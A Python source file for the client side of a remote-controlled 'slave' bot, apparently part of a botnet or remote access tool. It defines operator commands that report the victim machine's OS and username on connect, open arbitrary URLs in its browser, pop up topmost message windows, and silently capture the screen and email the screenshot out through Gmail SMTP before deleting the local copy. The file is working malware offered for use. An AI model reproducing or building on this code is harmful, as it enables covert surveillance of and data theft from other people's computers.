from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
from typing import List
from tkinter import Tk, Label
from pathlib import Path
import platform
import time
import getpass
import webbrowser
import smtplib
import mss
import os

from slave.lib.client import Bot, BotArgsParser



BotBasic = Bot(bot_type="BotBasic")
BotV2 = Bot(bot_type="BotV2")


@BotBasic.register('quit', all=True, help_text="Kill bot -- Usage: $quit [/all | <bot_id>]")
def exit_server(bot: Bot, args: List[str]):
    bot.exit_server()


@BotBasic.register('info', all=True, help_text="Information of bot machine -- Usage: $info [/all | <bot_id>]", on_connect=True)
def sys_info(bot: Bot, args: List[str] = None):
    template = f"OS: {platform.system()} {platform.release()} -- Processor: {platform.processor()} \
-- Computer name: {getpass.getuser()} -- Bot type: {bot.bot_type}"
    bot.send_text(template)


@BotBasic.register('help', help_text="Help text of command -- Usage: $help <cmd>")
def helper(bot: Bot, args: List[str]):
    if len(args) < 2:
        bot.send_command_help()
    else:
        cmd_dict = bot.COMMAND_SET.get(args[1], None)
        if cmd_dict is not None:
            bot.send_text(cmd_dict['help_text'])
        else:
            bot.send_text("Command not found")


## BotV2 Commands ##

@BotV2.register('visit', all=True, help_text="Open url with webbroser -- Usage: $visit [/all | <bot_id>] <url>")
def vist_url(bot: Bot, args: List[str]):
    bot.send_text(f"Opening page... {args[1]}")
    webbrowser.open(args[1])


@BotV2.register('message', all=True, help_text="Message show with tkinter", argparse=True)
def show_msg_with_tk(bot: Bot, args: List[str]):
    parser = BotArgsParser()
    parser.connect_bot(bot)

    parser.add_argument('-m', '--message', dest='message', required=True, nargs="+")
    parser.add_argument('--msec', dest='msecond', type=int)
    
    cargs = parser.parse_args(args)

    win = Tk()
    win.title("Slave Message")
    win.resizable(False, False)
    lbl = Label(win, text=' '.join(cargs.message), font=('Aria Bold', 50))
    lbl.grid(column=0, row=0)
    win.attributes("-topmost", True)
    if cargs.msecond:
        win.after(cargs.msecond, lambda: win.destroy())
    bot.send_text("Opening tkinter frame...")
    def on_close():
        bot.send_text("Frame closed!")
        win.destroy()
    win.protocol("WM_DELETE_WINDOW",  on_close)
    win.mainloop()


@BotV2.register('screenshot', all=True, help_text="Take sceenshot and send your email(Only Gmail)", argparse=True)
def take_screenshot(bot: Bot, args: List[str]):
    try:
        parser = BotArgsParser(description='Take screenshot and send your email')
        parser.connect_bot(bot)

        parser.add_argument('-e', '--email', help="Email address", dest="email", required=True)
        parser.add_argument('-p', '--password', help="Password", dest="password", required=True)

        cargs = parser.parse_args(args)
        email, password = cargs.email, cargs.password
        
        body = MIMEMultipart()
        body['From'] = email
        body['To'] = email
        body['Subject'] = f"Slave bot {bot.bot_id} screenshot"

        body.attach(MIMEText("Screenshot"))

        # Connect SMTP server
        bot.send_text("Login email server...")
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)

        # Take sceenshot
        bot.send_text("Taking screenshot...")
        shot_path = bot.ROOT_PATH / 'tempt'
        shot_path.mkdir(parents=True, exist_ok=True)
        sc_name = f"{bot.bot_id}_screenshot.png" 
        
        with mss.mss() as sct:
            output = sct.shot(output=str(shot_path / sc_name))

        part = MIMEApplication(open(output, 'rb').read())
        part['Content-Disposition'] = f'attachment; filename="{output}"'
        body.attach(part)

        # Send and quit
        server.send_message(body) 
        server.quit()
        bot.send_text(f'Screenshot send {email}')

        # Delete screenshot from local
        os.remove(str(shot_path / sc_name))
        shot_path.rmdir()
        
    except smtplib.SMTPAuthenticationError as authex:
        bot.send_text(f"Authentication problem: Wrong email address or password")
    except Exception as generalex:
        bot.send_text(f"Problem occurred: {generalex}")
        
BotV2.use_other_bot_commands(BotBasic)
